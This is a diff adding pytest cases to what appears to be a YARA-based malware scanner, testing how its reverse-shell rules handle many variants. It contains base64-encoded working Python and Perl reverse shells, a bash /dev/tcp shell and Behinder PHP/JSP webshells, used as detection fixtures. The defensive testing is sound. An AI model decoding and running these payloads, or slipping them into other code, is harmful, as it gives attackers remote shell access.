@@ -90,6 +90,34 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+def _python_socket_shell_fixture() -> str:
+    """Complete Python reverse shell: socket client plus fd redirection and shell spawn.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z"
+        "CnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0p"
+        "CnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDAp"
+        "Cm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJw"
+        "cm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK"
+    ).decode()
+
+
+def _perl_socket_shell_fixture() -> str:
+    """Complete Perl reverse shell: socket client plus stdio redirection and shell exec.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKJGk9IjEwLjAuMC4xIjskcD00NDQ0Owpzb2NrZXQoU09DS0VULFBG"
+        "X0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTsKY29ubmVjdChT"
+        "T0NLRVQsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpOwpvcGVuKFNURElOLCI+"
+        "JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsIj4m"
+        "U09DS0VUIik7CmV4ZWMoIi9iaW4vc2ggLWkiKTsK"
+    ).decode()
+
+
 _WEBSHELL_FIXTURES = {
     "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
     "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
@@ -104,7 +132,7 @@ def _webshell_fixture(name: str) -> str:
 
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
-    return any(rule_name in f.message for f in findings)
+    return any(f"YARA rule '{rule_name}'" in f.message for f in findings)
 
 
 # ── Core pipeline ────────────────────────────────────────────────────
@@ -603,6 +631,286 @@ class TestBuiltInMalwarePackaging:
         )
         assert _has_rule(findings, "reverse_shell")
         assert any(f.rule_id == "YR1" for f in findings)
+
+    @pytest.mark.parametrize(
+        "content, filename",
+        [
+            (_python_socket_shell_fixture(), "shell.py"),
+            (
+                _python_socket_shell_fixture()
+                .replace("import socket,subprocess,os", "import socket,subprocess,os,pty")
+                .replace("subprocess.call", "pty.spawn"),
+                "pty_shell.py",
+            ),
+            (
+                _python_socket_shell_fixture().replace(
+                    'p=subprocess.call(["/bin/sh","-i"])', 'os.execl("/bin/sh", "sh", "-i")'
+                ),
+                "exec_shell.py",
+            ),
+            (_perl_socket_shell_fixture(), "shell.pl"),
+        ],
+    )
+    def test_builtin_reverse_shell_matches_complete_socket_shells(
+        self, content: str, filename: str
+    ) -> None:
+        assert _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
+
+    @pytest.mark.parametrize(
+        "content, filename",
+        [
+            (
+                "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+                's.connect(("10.0.0.1", 4444))\n',
+                "client.py",
+            ),
+            ("use Socket;\nsocket(SOCKET, PF_INET, SOCK_STREAM, 6);\n", "client.pl"),
+        ],
+    )
+    def test_builtin_reverse_shell_ignores_plain_socket_clients(
+        self, content: str, filename: str
+    ) -> None:
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
+
+    @pytest.mark.parametrize(
+        "encoded, filename",
+        [
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwg"
+                "c29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA4MDgwKSkKc3VicHJvY2Vz"
+                "cy5ydW4oWyJkYXRlIl0sIGNoZWNrPVRydWUpCnMuc2VuZGFsbChiImhlYWx0aGNoZWNrXG4iKQpzLmNs"
+                "b3NlKCkK",
+                "client.py",
+            ),
+            (
+                "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnlu"
+                "YW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbig4MDgwLCBpbmV0X2F0b24oIjEy"
+                "Ny4wLjAuMSIpKSk7Cm9wZW4oU1RET1VULCAiPiIsICJjbGllbnQubG9nIikgb3IgZGllICQhOwpwcmlu"
+                "dCBTT0NLRVQgImhlYWx0aGNoZWNrXG4iOwpjbG9zZShTT0NLRVQpOwo=",
+                "client.pl",
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5T"
+                "T0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTI3LjAuMC4xIiwgODA4MCkpCndpdGggb3BlbigiY2xpZW50"
+                "LmxvZyIsICJ3IikgYXMgbG9nZmlsZToKICAgIG9zLmR1cDIobG9nZmlsZS5maWxlbm8oKSwgMSkKcHJp"
+                "bnQoImhlYWx0aGNoZWNrIikK",
+                "redirect.py",
+            ),
+        ],
+    )
+    def test_builtin_reverse_shell_ignores_client_subprocess_and_file_logging(
+        self, encoded: str, filename: str
+    ) -> None:
+        content = base64.b64decode(encoded).decode()
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
+
+    @pytest.mark.parametrize("single_line", [False, True])
+    @pytest.mark.parametrize(
+        "encoded, filename",
+        [
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+                "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jp"
+                "bi9zaCIsICItaSJdLCBzdGRpbj1zLmZpbGVubygpLCBzdGRvdXQ9cy5maWxlbm8oKSwgc3RkZXJyPXMuZmlsZW5v"
+                "KCkpCg==",
+                "socket_streams.py",
+            ),
+            (
+                "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0"
+                "Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbig0NDQ0LCBpbmV0X2F0b24oIjEyNy4wLjAuMSIpKSk7"
+                "Cm9wZW4gU1RESU4sICI8JlNPQ0tFVCI7Cm9wZW4gU1RET1VULCAiPiZTT0NLRVQiOwpvcGVuIFNUREVSUiwgIj4m"
+                "U09DS0VUIjsKZXhlYyAiL2Jpbi9zaCIsICItaSI7Cg==",
+                "perl_no_parens.pl",
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
+                "Y2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTI3LjAuMC4xIiwgODA4MCkpCmxvZ2ZpbGUgPSBvcGVuKCJj"
+                "bGllbnQubG9nIiwgInciKQpvcy5kdXAyKGxvZ2ZpbGUuZmlsZW5vKCksIDEpCnN1YnByb2Nlc3MucnVuKFsiL2Jp"
+                "bi9zaCIsICItYyIsICJkYXRlIl0sIGNoZWNrPVRydWUpCnMuc2VuZGFsbChiImhlYWx0aGNoZWNrXG4iKQpzLmNs"
+                "b3NlKCkK",
+                "local_file_shell.py",
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+                "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA4MDgwKSkKbG9nZmlsZSA9IG9wZW4oImNsaWVu"
+                "dC5sb2ciLCAidysiKQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1jIiwgImRhdGUiXSwgc3RkaW49bG9n"
+                "ZmlsZS5maWxlbm8oKSwgc3Rkb3V0PWxvZ2ZpbGUuZmlsZW5vKCksIHN0ZGVycj1sb2dmaWxlLmZpbGVubygpKQo=",
+                "local_file_streams.py",
+            ),
+        ],
+    )
+    def test_socket_stream_relationships(self, encoded, filename, single_line):
+        content = base64.b64decode(encoded).decode()
+        if single_line:
+            content = content.replace("\n", " " if filename.endswith(".pl") else "; ")
+        findings = _run_builtin(content, filename)
+        expected = "reverse_shell" if single_line else "reverse_shell_multiline"
+        assert _has_rule(findings, expected)
+        assert not _has_rule(
+            findings, "reverse_shell_multiline" if single_line else "reverse_shell"
+        )
+        for finding in findings:
+            if _has_rule([finding], expected):
+                assert finding.severity == ("CRITICAL" if single_line else "HIGH")
+                assert finding.confidence == (0.85 if single_line else 0.65)
+
+    @pytest.mark.parametrize(
+        "variant",
+        [
+            "unknown",
+            "dynamic",
+            "oversized",
+            "invalid",
+            "wrapped",
+            "exec",
+            "wildcard",
+            "opener",
+            "with_rebind",
+            "namedexpr",
+            "import_rebind",
+            "import_side_effect",
+        ],
+    )
+    def test_uncertain_python_bindings_keep_reverse_shell_candidate(self, variant):
+        content = _python_socket_shell_fixture()
+        if variant == "unknown":
+            content = content.replace("s.fileno()", "stream.fileno()")
+        elif variant == "dynamic":
+            content = "if True:\n" + "\n".join("    " + line for line in content.splitlines())
+        elif variant == "oversized":
+            content = "#" + "x" * 8192 + "\n" + content
+        elif variant == "invalid":
+            content = "unparsed ! syntax\n" + content
+        elif variant in {"exec", "wildcard", "namedexpr", "import_rebind", "import_side_effect"}:
+            content = content.replace("os.dup2", "f=open('client.log', 'w')\nos.dup2", 1)
+            if variant == "exec":
+                content = content.replace("os.dup2", 'exec("f = s")\nos.dup2', 1)
+            elif variant == "wildcard":
+                content = "from custom_io import *\n" + content
+            elif variant == "namedexpr":
+                content = content.replace("os.dup2", "(f := s)\nos.dup2", 1)
+            elif variant == "import_rebind":
+                content = content.replace("os.dup2", "from socket_stream import f\nos.dup2", 1)
+            else:
+                content = "import custom_open\n" + content
+            content = content.replace("os.dup2(s.fileno()", "os.dup2(f.fileno()")
+        elif variant == "opener":
+            offset = content.index("os.dup2")
+            tail = content[offset:].replace("s.fileno()", "f.fileno()")
+            content = (
+                content[:offset]
+                + "with open('client.log', opener=lambda *_: s.fileno()) as f:\n"
+                + "\n".join("    " + line for line in tail.splitlines())
+            )
+        elif variant == "with_rebind":
+            content = content.replace(
+                "s=socket.socket",
+                "f=open('log', 'w')\nwith open('other', 'w') as other:\n    f=socket.socket",
+            )
+            content = content.replace("s.connect", "f.connect").replace("s.fileno()", "f.fileno()")
+        else:
+            content = content.replace("os.dup2", "wrapped=open(s.fileno(), 'r+')\nos.dup2", 1)
+            content = content.replace("os.dup2(s.fileno()", "os.dup2(wrapped.fileno()")
+        assert _has_rule(_run_builtin(content, "uncertain.py"), "reverse_shell_multiline")
+
+    @pytest.mark.parametrize("single_line", [False, True])
+    @pytest.mark.parametrize(
+        "variant, encoded",
+        [
+            (
+                "comprehension",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKW29zLmR1cDIocy5maWxlbm8oKSxmZCkg"
+                "Zm9yIGZkIGluICgwLDEsMildCnB0eS5zcGF3bigiL2Jpbi9zaCIpCg==",
+            ),
+            (
+                "direct_objects",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+                "aCIsIi1pIl0sc3RkaW49cyxzdGRvdXQ9cyxzdGRlcnI9cykK",
+            ),
+            (
+                "bare_shell",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9z"
+                "LmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcHR5LnNwYXduKCJzaCIpCg==",
+            ),
+            (
+                "usr_shell",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9z"
+                "LmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcHR5LnNwYXduKCIvdXNyL2Jpbi9iYXNo"
+                "IikK",
+            ),
+            (
+                "perl_system",
+                "dXNlIFNvY2tldDsKJGk9IjEwLjAuMC4xIjskcD00NDQ0Owpzb2NrZXQoU09DS0VULFBGX0lORVQsU09DS19TVFJF"
+                "QU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTsKY29ubmVjdChTT0NLRVQsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9u"
+                "KCRpKSkpOwpvcGVuKFNURElOLCI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERF"
+                "UlIsIj4mU09DS0VUIik7CnN5c3RlbSgiL2Jpbi9zaCAtaSIpOwo=",
+            ),
+            (
+                "loop",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKZm9yIGZkIGluICgwLDEsMik6IG9zLmR1"
+                "cDIocy5maWxlbm8oKSxmZCkKcHR5LnNwYXduKCIvYmluL2Jhc2giKQo=",
+            ),
+            (
+                "streams_reordered",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+                "aCIsIi1pIl0sc3RkZXJyPXMsc3RkaW49cyxzdGRvdXQ9cykK",
+            ),
+            (
+                "connect_gap",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKI3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4Cm9zLmR1cDIocy5maWxlbm8oKSww"
+                "KQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnB0eS5zcGF3bigic2giKQo=",
+            ),
+            (
+                "renamed_socket",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCmNvbm49c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2Nr"
+                "ZXQuU09DS19TVFJFQU0pCmNvbm4uY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihjb25uLmZpbGVu"
+                "bygpLDApCm9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQpvcy5kdXAyKGNvbm4uZmlsZW5vKCksMikKcD1zdWJwcm9j"
+                "ZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK",
+            ),
+        ],
+    )
+    def test_reviewed_shell_forms_preserve_severity(self, variant, encoded, single_line):
+        # Payloads are decoded and scanned as text only, never executed.
+        content = base64.b64decode(encoded).decode()
+        if single_line:
+            content = content.replace("\n", " " if variant == "perl_system" else "; ")
+        findings = _run_builtin(content, "sample.pl" if variant == "perl_system" else "sample.py")
+        expected = "reverse_shell" if single_line else "reverse_shell_multiline"
+        matching = [f for f in findings if _has_rule([f], expected)]
+        assert matching
+        assert all(f.severity == ("CRITICAL" if single_line else "HIGH") for f in matching)
+        assert all(f.confidence == (0.85 if single_line else 0.65) for f in matching)
+        assert not _has_rule(
+            findings, "reverse_shell_multiline" if single_line else "reverse_shell"
+        )
+
+    @pytest.mark.parametrize("wrapper", ["flat", "function", "print"])
+    def test_local_file_shell_evidence_is_uncertain(self, wrapper):
+        content = (
+            _python_socket_shell_fixture()
+            .replace("os.dup2", 'log = open("client.log", "a")\nos.dup2', 1)
+            .replace("s.fileno()", "log.fileno()")
+        )
+        if wrapper == "function":
+            content = "def main():\n" + "\n".join("    " + line for line in content.splitlines())
+            content += '\nif __name__ == "__main__":\n    main()\n'
+        elif wrapper == "print":
+            content = content.replace("os.dup2", 'print("sent")\nos.dup2', 1)
+        findings = _run_builtin(content)
+        assert not _has_rule(findings, "reverse_shell")
+        matching = [f for f in findings if _has_rule([f], "reverse_shell_multiline")]
+        assert matching
+        assert all(f.severity == "HIGH" and f.confidence == 0.65 for f in matching)
 
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
